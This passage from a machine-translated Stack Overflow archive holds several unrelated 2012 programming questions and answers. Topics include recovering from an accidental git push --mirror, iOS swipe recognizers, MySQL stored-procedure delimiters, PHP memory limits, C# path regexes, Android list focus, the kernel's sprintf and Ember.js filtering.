*   即使到目前为止我还没有恢复任何东西，我在 Github 上看到了远程提交。例如 [https://github.com/rtCamp/buddypress-media/commit/4614fcdacfbe21dae88e50e66707ef57b786ee37](https://github.com/rtCamp/buddypress-media/commit/4614fcdacfbe21dae88e50e66707ef57b786ee37)

这意味着数据存在于远程...

**什么可能有效：**

1.  如果我可以使用所有日志克隆 Github 存储库，包括有关本地已删除“提交”的日志，那么我的“本地”也将删除提交。之后可能是 git reflog/rebase/reset 练习。

2.  我假设由于远程 git 本身就是一个完整的存储库，并且它[通过 SHA1 哈希显示提交](https://github.com/rtCamp/buddypress-media/commit/4614fcdacfbe21dae88e50e66707ef57b786ee37)，如果我可以在“远程”上运行 git reflog/rebase/reset，理论上可能会起作用。

请注意，我正在寻找纯 git 方式。我们可以手动下载“标签”（zip），从 SVN 恢复（我们在 1.x 期间使用 SVN）

请让我知道您的建议/解决方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T17:48:07.827

我很难学到 git 中的数据可能会丢失。

我的问题没有答案。我不得不做一些手工工作（从旧的 svn 档案中复制旧标签 + 下载一些压缩版本并标记它们，等等）

所以，如果你这样做：

1.  在本地初始化一个 git repo，向其中添加一些文件并提交它。
2.  然后更改远程来源，然后`git push --mirror`对远程服务器执行

远程仓库将是您本地仓库的完整镜像。如果远程仓库有其他克隆/备份/镜像等，则无法撤消此操作。

当然，我所做的（不小心）是非标准的方式，所以 git 不对此负责......

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-04T13:14:52.647

这是 undoing 的一个非常中肯的解决方案`git push -mirror`。

[如何撤消“git push --mirror”？](https://stackoverflow.com/questions/9184438/how-to-undo-git-push-mirror)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2018-08-10T23:34:46.970

`git push --tags`来自另一个具有所有先前标签的本地 git 存储库会有所帮助。

# objective-c - 在 UIScrollView 中使用 UISwipeGestureRecognizer，无法检测到右滑动，只能检测到左滑动

> ID：12264244
> 
> 赞同：2
> 
> 时间：2012-09-04T13:13:04.733
> 
> 标签：objective-c, uiscrollview, uiswipegesturerecognizer

我在 UIScrollView 中有一个 UIView *demoView*。我想垂直滚动 UIScroll 视图而不是水平滚动。我将 UISwipeGestureRecognizer 添加到 UIView。代码是（这里的self是UIScrollView）：

```
self.demoView.userInteractionEnabled = YES;
UISwipeGestureRecognizer *rightSwipe = [[UISwipeGestureRecognizer alloc] 
    initWithTarget:self action:@selector(rightSwipeLineChart:)];
rightSwipe.direction = UISwipeGestureRecognizerDirectionRight;
[self.demoView addGestureRecognizer:rightSwipe];

UISwipeGestureRecognizer *leftSwipe = [[UISwipeGestureRecognizer alloc] 
    initWithTarget:self action:@selector(leftSwipeLineChart:)];
[self.demoView addGestureRecognizer:leftSwipe]; 
```

结果是我只能检测到左滑动手势，无法检测到右滑动手势。我的代码有什么问题？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-17T17:08:54.277

UISwipeGestureRecognizer 方向属性的默认值是 UISwipeGestureRecognizerDirectionRight，因此您正在创建两个执行相同操作的识别器。

这就是我解决问题的方法：

```
for (int i = 0; i < 2; i++) {
    UISwipeGestureRecognizer *swipeRecognizer = [[UISwipeGestureRecognizer alloc] initWithTarget:self action:@selector(onGestureSwipe:)];
    swipeRecognizer.direction = (i == 0 ? UISwipeGestureRecognizerDirectionRight : UISwipeGestureRecognizerDirectionLeft);
    [self.tableView addGestureRecognizer:swipeRecognizer];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T07:57:11.090

很难检测到 UIScrollView 或 UIWebView 的滑动。您可以从这里使用“Swipe4ScrollViews”： [UISwipeGestureRecognizer not working](https://stackoverflow.com/questions/4407171/uiswipegesturerecognizer-not-working/6937646#6937646)

# mysql - 存储过程 3 的 mySql 错误 1064

> ID：12264245
> 
> 赞同：1
> 
> 时间：2012-09-04T13:13:10.977
> 
> 标签：mysql, syntax-error

救命啊！！！...下面有什么问题？？我收到箭头指示的行的 SQL 语法错误号 1064。

```
CREATE PROCEDURE SP_IsProductInBasket (
  IN customerId INT(11),
  IN productId TINYTEXT
)
BEGIN
  SELECT
    products_id
  FROM customers_basket
  WHERE customers_id = customerId
    AND products_id = productId;    <------ error here????!!!
END 
```

我已经验证了选择作为一个独立的作品可以正常工作

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:15:00.917

尝试更改分隔符，

```
DELIMITER $$
CREATE PROCEDURE SP_IsProductInBasket 
(
  IN customerId INT(11),
  IN productId TINYTEXT
)
BEGIN
  SELECT   products_id
  FROM     customers_basket
  WHERE    customers_id = customerId AND 
           products_id = productId;   
END $$
DELIMITER ; 
```

# sql - 如何获取列描述

> ID：12264246
> 
> 赞同：-2
> 
> 时间：2012-09-04T13:13:20.330
> 
> 标签：sql, sql-server

例如，在 [emp] 表中，列是：

```
emp_id    emp_name    emp_role 
```

如果在`emp_role`列值中插入的值可以是 0（对于管理员）、1（对于管理）、2（对于员工）。

现在有什么方法可以在 SQL Server 数据库中获取列的这些详细信息`emp_role`（例如，管理员为 0）以及相关表（即）？`[emp]`

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T15:46:01.463

如果您有带有角色定义的字典表，它将类似于：

```
select e.emp_id, e.emp_name, r.name
from emp e
inner join role r on e.emp_role = r.id 
```

如果不是，但您知道角色名称，它将类似于：

```
select emp_id, emp_name, 
case emp_role when 0 then 'Administrator' when 1 then 'Management' when 2 then 'Employees' end as RoleName
from emp 
```

# c# - 具有图形功能的 Windows 8 C# 和 XAML 应用程序的程序架构

> ID：12264247
> 
> 赞同：4
> 
> 时间：2012-09-04T13:13:22.600
> 
> 标签：c#, windows-8, windows-runtime, winrt-xaml

如果我想创建一个不一定要全屏运行的游戏，而只需要在屏幕的某处显示 2D/3D 图形，我最好的方法是什么？

![快速线框](../Images/e15338dcf8e26ab3e32827bde4201dac.png)

一些具体问题可能是：

*   渲染区域将使用什么组件？
*   是否有任何游戏库可以用于渲染区域？
*   根据微软在这里使用的最“纯粹”或“规范”的堆栈是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-04T18:49:53.900

Omega——Visual Studio 2010 和 2012 都是 WPF 应用程序。WinRT 适用于平板电脑/手机。WPF 当然不会过时。

如果我是你，我不会按照画布强制你的方式呈现所有内容，将中心项设置为名为 Frame 的 UI 元素可能是一种更好的方法，它是 WPF 中所有 UI 相关内容的基本元素。

通过这种方式，无论您决定 An ImageSourceType 还是 Canvas 更适用于游戏的特定功能，您都可以利用 Frame 中所有可能的控件类型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T15:10:57.187

根据您想要绘制图形的方式，您可以使用（但绝不限于）：

*   画布 - 完全适合慢速游戏。通过这种方式，您可以获得各种 WPF 布局例程的好处，并且还可以在 XAML/向量中定义场景内的对象。
*   WPF 支持 3D 图形（在后端使用 Direct3D），因此您可以设置正交投影矩阵并将其视为 Direct3D 上下文（使用 WPF API）。我没有足够的经验知道这与 D3D 相比有多慢，但它肯定更容易（例如，内置的“场景图”，如来自 XAML 架构的支持）。
*   如果你想全面使用 Direct3D，你可以使用 SlimDX，它有[一个我过去使用过的 WPF 垫片](https://stackoverflow.com/questions/2246386/slimdx-viewports-in-wpf-controls)，以及另一个[第三方控件](http://slimdxcontrol.codeplex.com/)。可能还有其他可用的库。
*   [使用 WriteableBitmap（请参阅WriteableBitmapEx](http://writeablebitmapex.codeplex.com/)以了解具有更友好 API 的第三方版本）或类似方法直接向/从位图进行位图传输。

可能还有很多其他选择。如果它是一个不需要超快帧速率的慢节奏游戏，我的首选是最初使用 Canvas（布局工作确实会产生相当大的开销，但它的工作量更少，并且可能更容易获得准确的方式你要）。

如果您想要绝对的控制和速度，请通过 SlimDX 使用 D3D，但如果您是新手，这将是一个相当大的学习曲线。

# php - 允许的内存大小 134217728 字节已用尽

> ID：12264253
> 
> 赞同：12
> 
> 时间：2012-09-04T13:13:37.760
> 
> 标签：php, memory, memory-management

热解决这个问题，为什么会发生？

**Zend 服务器日志：**

> PHP 致命错误：第 3 行 C:\Program Files (x86)\Zend\Apache2\htdocs\test\modules\main.php 中允许的内存大小为 134217728 字节已用尽（试图分配 538798977 字节）

如果文件`main.php`直接从浏览器执行，则不会产生任何错误。但是，如果我从另一个 PHO 文件中使用它的函数，那么 Zend Log 会打印出上述错误。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-04T13:16:01.100

我也遇到过这个问题。

增加以下变量，使您的页面执行不会停止：

*   `max_input_time`
*   `memory_limit`
*   `max_execution_time`

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-09-04T13:16:21.337

要么增加内存限制`php.ini`，要么尝试优化应用程序中的任何大型数据结构（如数组）。

在任何情况下，如果您的 PHP 应用程序使用 128MB 的 RAM，则可能出现问题。

此外，正如 Fluffeh 在评论中所指出的，您到底在做什么来利用 500MB 的 RAM？

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-09-04T13:15:59.657

尝试这个：

```
ini_set('memory_limit', '-1'); 
```

[php.net/memory_limit](http://php.net/memory_limit)

它将占用服务器的无限内存使用。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-03-24T15:28:17.390

除了 user1427811 还可以监控`time_limit`下载`memory_limit`文件前后：

```
function custom_put_contents($source_url='',$local_path=''){

    $time_limit = ini_get('max_execution_time');
    $memory_limit = ini_get('memory_limit');

    set_time_limit(0);
    ini_set('memory_limit', '-1');      

    $remote_contents=file_get_contents($source_url);
    $response=file_put_contents($local_path, $remote_contents);

    set_time_limit($time_limit);
    ini_set('memory_limit', $memory_limit); 

    return $response;
} 
```

# google-apps-script - 通过 Google Apps 脚本在 Google 站点中显示 Google 电子表格数据的示例

> ID：12264255
> 
> 赞同：-1
> 
> 时间：2012-09-04T13:13:44.137
> 
> 标签：google-apps-script, google-sheets, google-sites

我看到有些人试图通过谷歌应用程序脚本从谷歌电子表格中获取数据以粘贴在他们的谷歌网站中：

[如何通过 Google Apps 脚本访问不同 Google 电子表格上的数据？](https://stackoverflow.com/questions/11727975/how-to-access-data-on-different-google-spreadsheet-through-google-apps-script)

我可以猛烈抨击代码片段，但我不认为有人在任何地方都有工作示例？

提前谢谢了

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-09-11T10:23:13.923

我一直在寻找这样的东西：

[https://sites.google.com/site/testappscript2/](https://sites.google.com/site/testappscript2/)

目前，如果您没有登录 Google，我认为您不会看到任何内容，但如果您登录了，那么它可能会显示以下内容：

欢迎，不知道你的名字，但如果你在这里添加你的详细信息：[https](https://docs.google.com/spreadsheet/ccc?key=0Aq72y9iq5_1UdG5LR0tCVTRXOVQtbkNLR1Q3eE5MR0E#gid=0) ://docs.google.com/spreadsheet/ccc?key=0Aq72y9iq5_1UdG5LR0tCVTRXOVQtbkNLR1Q3eE5MR0E#gid=0 我可以告诉你你的下一个任务

如果您的谷歌邮件在电子表格中，它将显示一条个性化的消息。

我的想法是根据教师如何更新在线电子表格中的学生数据来管理学生在谷歌网站上看到的课程，这样学生就可以看到他们已经完成了哪些作业——他们接下来要做什么，甚至可能是他们的成绩......

# ruby-on-rails - rails插件没有安装

> ID：12264260
> 
> 赞同：0
> 
> 时间：2012-09-04T13:14:06.960
> 
> 标签：ruby-on-rails, syntax, ruby-on-rails-plugins

我正在尝试安装 restful_authentication 插件使用以下 git ...

```
git://github.com/Satish/restful-authentication.git 
```

我正在尝试使用以下命令安装...

c:\Users\Admin\Downloads\rails_apps\students>`ruby script/plugin install git://github.com/Satish/restful-authentication.git`

但它没有按预期安装，请帮助，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:22:14.923

不完全是答案，但是您使用的是什么版本的导轨？restful 认证插件很久没有更新了，你可以在 github 项目上看到：[https](https://github.com/technoweenie/restful-authentication) ://github.com/technoweenie/restful-authentication 。除非您使用的是 Rails 2.3.x，否则我建议您查看：[https ://github.com/plataformatec/devise](https://github.com/plataformatec/devise)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:56:03.563

尝试在**终端**上使用用户：

```
[sudo] gem install restful-authentication 
```

或者

```
[sudo] rails plugin install git://github.com/Satish/restful-authentication.git restful_authentication 
```

并插入**Gemfile**：

```
[sudo] gem "restful-authentication", "~> 1.2.1" 
```

或者

```
[sudo] gem "restful-authentication" 
```

*   ***如果您使用的是 linux 或 mac，则可以使用 sudo。***

# mysql - MySQL - 在存储过程中跳转到“foo:Begin”

> ID：12264261
> 
> 赞同：0
> 
> 时间：2012-09-04T13:14:08.763
> 
> 标签：mysql, stored-procedures

例如，我有这样的代码：

```
...
PROCEDURE procedure1(... some parameters ...)
BEGIN
  DECLARE l_xxx VARCHAR(5);

  SET l_xxx = 'ERROR';

  IF l_xxx = 'ERROR' THEN
     -- in this section, I want to call 'foo' process below
  END IF;

  foo:BEGIN
     -- Some process
  END;
END; 
```

我可以`error:BEGIN`在存储过程中调用..吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T15:05:42.270

1.  您可以创建另一个存储过程，并调用它而不是类似 GOTO 的命令。
2.  尝试在用户变量的帮助下使用 IF-THEN 语句来完成。

例如：

```
DECLARE l_xxx VARCHAR(5);

SET l_xxx = 'ERROR';
SET @a = NULL;

IF l_xxx = 'ERROR' THEN
  SET @a = 1; -- Set error flag
END IF;

IF @a IS NULL THEN
  -- Some process, when there were no errors.
END IF;

IF @a = 1 THEN
  BEGIN
  -- Some process
  END;
END IF; 
```

# java - 如何使用 Spring 在服务器端的客户端服务调用之间共享数据/对象？

> ID：12264262
> 
> 赞同：0
> 
> 时间：2012-09-04T13:14:08.837
> 
> 标签：java, spring, hibernate, session

我目前正在使用 Spring 和 Hibernate。目前，如果我从客户端进行创建对象调用（例如），则会在服务器端的服务存根上发出请求。服务调用必须创建一个新的休眠会话工厂，获取会话，然后进行事务。问题是每次都会发生这种情况，因此需要重新创建会话工厂才能使用。由于创建该工厂需要付出代价，因此这似乎非常浪费并且影响性能。

我想做的是重用一个会话工厂，例如，跨客户端或多个客户端进行的不同服务调用。问题是我不知道该怎么做，因为服务器端功能的入口点是服务调用。我知道我必须以某种方式在服务器端保存状态，以便不同的调用可以访问同一个会话工厂。我知道保持状态等的可伸缩性问题，但必须有一种方法可以重用以前创建的对象。

**我的问题**是如何使用 Spring 执行此操作（我应该使用 Session bean 还是 HttpSession）？容器是否可以在启动时设置这些东西，还是必须等待服务请求进入？

我大部分是Spring新手，只是我不了解Web服务角色吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T15:25:45.240

1.  你的是**典型的 MVC**场景，由 GWT+MVP 实现。根据您的描述，您似乎在每次通话时都创建会话工厂，这显然不是标准做法。
2.  会话工厂只**创建一次**，每个请求都在会话工厂创建的不同会话中执行。
3.  使用 Spring，典型的方法是使用**spring 布线和 hibernate**配置会话工厂。此配置仅在应用程序启动时加载一次。
4.  **在每个服务请求**上，从 bean-container 获取 session-factory 的引用（*而不是每次都创建它*）并从中创建会话以进行数据库操作。
5.  查看[**这个**](https://github.com/ashtonthomas/beans)使用 GWT+MVP+Spring+MyBatis 的项目。我了解您使用 Hibernate 而不是 MyBatis，但这将作为此类项目的参考。

# c# - 如何用C#中的给定模式替换字符串的第一部分

> ID：12264264
> 
> 赞同：-1
> 
> 时间：2012-09-04T13:14:13.730
> 
> 标签：c#, regex

我有以下字符串示例：

```
\\servername\Client\Range\Product\ 
```

、`servername`、和vales 可以是任何东西，但它们只是代表服务器上的 ta samba 共享`Client`。`Range``Product`

我希望能够采用其中一条路径，并`\`用一条新路径替换第四条之前的所有内容：例如：

```
\\10.0.1.1\ITClient\001\0012\ will become:

\\10.0.1.1\Archive\001\0012\ 
```

我得到的所有路径都将遵循相同的起始模式`\\servername\Client\`，使用 C# 如何替换字符串中的所有内容，直到第 4 个“\”？

我看过使用正则表达式，但我一直无法理解它的神奇和力量

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:21:56.237

此正则表达式模式将匹配到第 4 个`\`

```
^(?:.*?\\){4} 
```

用法：

```
var result = Regex.Replace(inputString, @"^(?:.*?\\){4}", @"\\10.0.1.1\Archive\"); 
```

稍微解释一下正则表达式：

```
^ // denotes start of line
 (?:…) // we need to group some stuff, so we use parens, and ?: denotes that we do not want to use the parens for capturing (this is a performance optimization)
 .*? // denotes any character, zero or more times, until what follows (\)
 \\ //denotes a backslash (the backslash is also escape char)
 {4} // repeat 4 times 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:18:37.280

除非我遗漏了一些重要的东西，否则您可以使用掩码并对其进行格式化：

```
static string pathMask = @"\\{0}\{1}\{2}\{3}\";

string server = "10.0.1.1";
string client = "archive";
string range = "001";
string product = "0012";

...

string path = string.Format(pathMask, server, client, range, product); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T13:19:27.380

您可以使用`String.Format`或`Path.Combine`

```
string template = @"\\{0}\{1}\{2}\{3}\";
string server = "10.0.1.1";
string folder = "Archive";
string range = "001";
string product = "0012";

string s1 = String.Format(template,
    server,
    folder,
    range,
    product);

// s1 = \\10.0.1.1\Archive\001\0012\

string s2 = Path.Combine(@"\\", server, folder, range, product);

// s2 = \\10.0.1.1\Archive\001\0012\ 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-04T13:27:48.667

优雅的正则表达式解决方案是：

```
(new Regex(@"(?<=[^\\]\\)[^\\]+")).Replace(str, "Archive", 1); 
```

将单个斜杠后面的部分字符串替换为*“存档”*字符串。

### [在此处](http://ideone.com/F29TM)测试此代码。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-04T13:25:54.440

字符串方法可以工作，但可能比正则表达式更冗长。如果您想匹配从字符串开头到第 4 个 \ 的所有内容，则以下正则表达式将执行此操作（假设您的字符串符合提供的模式）

```
^\\\\[^\\]+\\[^\\]+\\ 
```

所以一些代码类似于

```
string updated = Regex.Replace(@"\\10.0.1.1\ITClient\001\0012\", "^\\\\[^\\]+\\[^\\]+\\", @"\\10.0.1.1\Archive\"); 
```

应该做的伎俩。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-04T13:26:27.640

这个简单快速，只要我们只讨论 4 个部分：

```
string example = @"\\10.0.1.1\ITClient\001\0012\";
string[] parts = example.Split(new string[] { @"\" }, StringSplitOptions.RemoveEmptyEntries); 
```

# bison - 是否需要了解 BNF 语法才能学习 flex 和 Bison？

> ID：12264268
> 
> 赞同：2
> 
> 时间：2012-09-04T13:14:26.403
> 
> 标签：bison, flex-lexer

是否需要学习 BNF 语法或文本处理算法才能学习 Flex 和 Bison 或类似类型的解析器/扫描器？

我打算学习 flex 和 Bison，但我没有任何编译器写作水平的知识，所以请告诉我是否有可能在不了解 BNF 语法且没有编译器写作水平知识的情况下学习 flex 和 Bison。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:27:31.690

假设您将学习 BNF 语法和文本处理算法，作为学习 Flex 和 Bison 的副产品。如果您碰巧在学术上学习过 BNF，那么您之前的学习会对您有所帮助，但这种之前的学习可能对您的目的不是必需的。

顺便说一句，如果您的语言恰好是 C++，那么填补 Bison 旧角色的常用现代工具是[Boost Spirit。](http://boost-spirit.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-24T19:38:54.290

如果您在开始使用这些工具之前不知道，那么您以后就会知道。语法与这些工具齐头并进，因此这使您有机会同时学习这两种工具。

如果你想要一本关于这个主题的教科书，我推荐[这个](https://rads.stackoverflow.com/amzn/click/com/0123745144)。然而，它涵盖了许多其他主题，总体上是实现语言的一个很好的参考。

我选择的工具而不是 Flex/Bison 是[ANTLR](http://antlr.org/)。它是一种非常流行、现代且易于使用的工具。它有很好的文档以及一些可供参考的书籍。这是编辑器的截图： ![ANTLR](../Images/1ba6880dd73aa3764602d8d12a037ad4.png)

# android - ExpandableListView 中的焦点添加项

> ID：12264285
> 
> 赞同：4
> 
> 时间：2012-09-04T13:15:07.870
> 
> 标签：android, android-listview

这似乎很简单，但对于我的生活，我无法弄清楚。

我有一个带有自定义 ExpandableListAdapter 的 ExpandableListView，它继承自 BaseExpandableListAdapter。当我添加一个新项目时，我只想关注新项目。我不能让它工作。

我尝试了以下方法，但不起作用。这是在列表视图的活动中：

```
private void processNewItem(C360ItemOwner itemOwner, int pos){
    Item item = itemOwner.newItem(pos);
    expAdapter.notifyDatasetChanged();
    expandList.requestFocus();
    if (item.getParentType() == Item.PARENT_IS_CHECKLIST) {//main level
        expandList.setSelectedGroup(pos);
    } else //Item.PARENT_IS_ITEM //sub level
        expandList.setSelectedChild(item.getParentAsItem().getPosition(), pos, true);
} 
```

我尝试在 getView 方法的适配器中执行此操作，但不起作用：

```
public View getGroupView(int groupPosition, boolean isExpanded, View convertView,
        ViewGroup parent) {
    if (convertView == null)
        convertView = inf.inflate(R.layout.edit_group_item, null);
    Item group = (Item) getGroup(groupPosition);
    convertView.setTag(group);
    EditText edtParent = (EditText) convertView.findViewById(R.id.edtParent);
    edtParent.setTag(convertView);
    scatterItemText(edtParent);
    if (group.isNew()) {
        Toast.makeText(edtParent.getContext(), "Found Focus Item " + groupPosition, Toast.LENGTH_SHORT).show();
        edtParent.requestFocus();
    }
    return convertView;
} 
```

我尝试在适配器中设置几个字段：focusItem，一个只写的 Item 对象和 focusEdit，只读的 EditText 对象。所以我分配了项目并在 getView 中，它将编辑存储在一个字段中。我这样称呼它：

```
private void processNewItem(C360ItemOwner itemOwner, int pos){
    Item item = itemOwner.newItem(pos);
    expAdapter.setFocusItem(item);//<--Assign it here
    expAdapter.notifyDatasetChanged();
    EditText edtFocus = expAdapter.getFocusEdit();
    if (edtFocus != null)
        edtFocus.requestFocus();

} 
```

然后在适配器的getView中：

```
public View getGroupView(int groupPosition, boolean isExpanded, View convertView,
        ViewGroup parent) {
    if (convertView == null)
        convertView = inf.inflate(R.layout.edit_group_item, null);
    Item group = (Item) getGroup(groupPosition);
    convertView.setTag(group);
    EditText edtParent = (EditText) convertView.findViewById(R.id.edtParent);
    edtParent.setTag(convertView);
    scatterItemText(edtParent);
    if (group == focusItem) {
        Toast.makeText(edtParent.getContext(), "Found Focus Item " + groupPosition, Toast.LENGTH_SHORT).show();
        focusEdit = edtParent;
    }
    return convertView;
} 
```

我对最后一种方法非常有希望，但是这一行：

```
EditText edtFocus = expAdapter.getFocusEdit(); 
```

在 getView() 方法运行之前发生，该方法将分配它（因此它始终为空）！:-(请停止

编辑：我知道这会很草率，但是如果我确实运行了一个线程来等待几百毫秒以便 getView() 可能运行然后尝试获取 focusEdit 怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T14:15:24.517

好的，在 Foamy Guy 的帮助下想通了。我的预感是等待一段时间来检查 focusEdit 是否成功。我最初尝试用 1000 毫秒来给它足够的时间：

```
private void setFocus() {
    EditText edtFocus = expAdapter.getFocusEdit();
    if (edtFocus != null)
        edtFocus.requestFocus();
    else
        Toast.makeText(getActivity(), "BLAH!", Toast.LENGTH_SHORT).show();
}

final Runnable r = new Runnable()
{
    public void run() 
    {
        setFocus();

    }
};

private void processNewItem(C360ItemOwner itemOwner, int pos){
    Item item = itemOwner.newItem(pos);
    if (itemOwner.getItemCount() == 1)
        checkHasItems();
    expAdapter.setFocusItem(item);
    resetListAdapter(true);
    Handler handler = new Handler();
    handler.postDelayed(r, 1000);//this works
    //handler.postDelayed(r, 10);//this works too
    //handler.postDelayed(r, 1);//this works too
    //handler.post(r);//this too!
    //r.run();//NOT this.  This fails.
} 
```

然后我尝试了 10 毫秒，它仍然有效。然后只有一毫秒，令人惊讶的是，它也起作用了。Foamy 建议尝试立即发布，并且确实有效。我终于尝试按照 Foamy 的要求直接运行可运行文件，但失败了。

所以不确定，但这可以完成工作。谢谢你们的帮助。

# vb.net - 是否可以将 VB.net 程序中的 cookie 传输到 Mozilla Firefox？

> ID：12264287
> 
> 赞同：0
> 
> 时间：2012-09-04T13:15:13.900
> 
> 标签：vb.net, cookies, copy, browser, cookiecontainer

我有 vb.net 2010，我需要一种方法将 cookie 容器从我制作的程序传输到 Internet Explorer、Google Chrome、Safari 和 Mozilla Firefox 等网络浏览器。非常感谢所有答案:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:25:22.410

*好吧，我真的希望现代浏览器能够防止这种攻击（是的，你不应该能够从诸如stackoverflow.com*之类的 3 方域写入/读取 cookie ）。

如果您想在用户浏览器中实现用户 cookie，那么让它打开一些页面，其中 cookie 将在浏览器中实现......

# coldfusion - 函数 DayOfWeekAsString 替代

> ID：12264288
> 
> 赞同：1
> 
> 时间：2012-09-04T13:15:14.970
> 
> 标签：coldfusion

我`DayOfWeekAsString`在我的脚本中使用了返回完整日期名称的函数。

我正在寻找一些提供日期名称的功能，例如“SA，SU，MO，TU，......”

是否有可用的预定义功能？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-04T13:46:08.197

没有内置的东西可以做到这一点，但应该这样做：

```
uCase( left( dayOfWeekAsString( 1 ), 2 ) ) 
```

# c - Linux内核中是否有像sprintf这样的C函数？

> ID：12264291
> 
> 赞同：21
> 
> 时间：2012-09-04T13:15:24.500
> 
> 标签：c, linux-kernel, printf

是否有类似`sprintf()`Linux 内核的功能（如`printf()`-> `printk()`）？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-09-04T13:23:02.287

是的。 [https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/lib/vsprintf.c#n1828](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/lib/vsprintf.c#n1828)

```
int snprintf(char *buf, size_t size, const char *fmt, ...)
{
    va_list args;
    int i;

    va_start(args, fmt);
    i = vsnprintf(buf, size, fmt, args);
    va_end(args);

    return i;
}
EXPORT_SYMBOL(snprintf); 
```

`sprintf()`本身就容易发生缓冲区溢出。^([CERT 缓冲区溢出](https://www.securecoding.cert.org/confluence/display/seccode/STR31-C.+Guarantee+that+storage+for+strings+has+sufficient+space+for+character+data+and+the+null+terminator)，[Apple](https://developer.apple.com/library/mac/documentation/security/conceptual/securecodingguide/Articles/BufferOverflows.html)等)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-14T08:48:11.330

是的，只需包含 linux/kernel.h

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:19:18.433

是的，例如[这里](http://lxr.free-electrons.com/source/drivers/s390/net/ctcm_sysfs.c?v=2.6.32#L30)有检查

你可以使用 grep 来查看它是否在内核的源代码中

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-12T18:47:14.903

在实时 2.6 内核上运行 crash 确认 sprintf() 已定义，以及它的定义位置。

崩溃> sym sprintf

ffffffff81267ba0 (T) sprintf ../debug/kernel-2.6.39/linux-2.6.39-400.210.2.el6uek/lib/vsprintf.c: 1442

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-04-09T09:57:08.753

`sprintf()`由于缓冲区溢出而不安全。如果您需要将数据从用户空间传递到内核空间，请改用`copy_from_user()`; 它的作用类似`copy_to_user()`但方向相反。

# ember.js - Ember.Controller 数组内容过滤

> ID：12264292
> 
> 赞同：1
> 
> 时间：2012-09-04T13:15:24.893
> 
> 标签：ember.js, ember-data

我有一个小提琴[http://jsfiddle.net/kristaps_petersons/9wteJ/2/](http://jsfiddle.net/kristaps_petersons/9wteJ/2/)它加载 3 个对象并在视图中显示它们。数据显示正常，但在显示之前我无法过滤它。这个

```
nodes: function(){
        this.get('controller.content').filter(function(item, idx, en){
            console.log('should log this atleast 3x')
        })        
        return this.get('controller.content')
    }.property('controller.content') 
```

当模板迭代值数组时调用方法，但它永远不会进入循环并打印`console.log('should log this atleast 3x')`为什么会这样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-05T04:20:48.420

您正在尝试替换`controller.content`同时也绑定到它。您需要定义另一个属性，例如`filteredContent`并将其绑定到`controller.content`. 看看 Ember.SortableMixin 如何为定义了变量`arrangedContent`的控制器计算`sortProperties`变量。使用该方法作为模板，我会像这样实现它：

```
 filteredContent: Ember.computed('content', function() {
     var content = this.get('content');

     return this.filter(function(item, idx, en) {
        console.log('should log this atleast 3x');
     });        
 }).cacheable() 
```

这应该在控制器中实现，而不是在视图中。控制器是数据操作、计算属性和绑定的地方。

然后将视图布局绑定到`filteredContent`而不是`content`显示过滤后的数据。然后原始内容和过滤后的内容都可用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-05T08:18:54.763

好的，我让它工作了，但感觉有点奇怪。首先，我将方法移动到 Controller 类并将其更改为如下所示：

```
nodes: function(){
    console.log('BEFORE should log this atleast 3x', this.get('content.length'))
    this.get('content').forEach(function(item, idx, en){
        console.log('should log this atleast 3x')
    })
    console.log('AFTER should log this atleast 3x', this.get('content.length'))
    return this.get('content')
}.property('content').cacheable() 
```

因为它应该与 buuda 的推荐相同，因为我从文档`.poperty()`中了解到与`Ember.computed`. 由于它仍然无法正常工作，我更改`.property('content')`为`.property('content.@each')`并且它正在工作。小提琴：http: [//jsfiddle.net/kristaps_petersons/9wteJ/21/](http://jsfiddle.net/kristaps_petersons/9wteJ/21/)。我猜想，该模板首先创建一个绑定，`controller.content`并且由于内容本身没有更改，因此不会再次通知此方法，而是模板在数据可用时提取数据。

# cmake - Linux 上的 CMake：“目标平台不支持动态链接”

> ID：12264299
> 
> 赞同：16
> 
> 时间：2012-09-04T13:15:46.957
> 
> 标签：cmake, static-linking, dynamic-linking

我有很简单的`CMakeLists.txt`

```
CMAKE_MINIMUM_REQUIRED(VERSION 2.8)
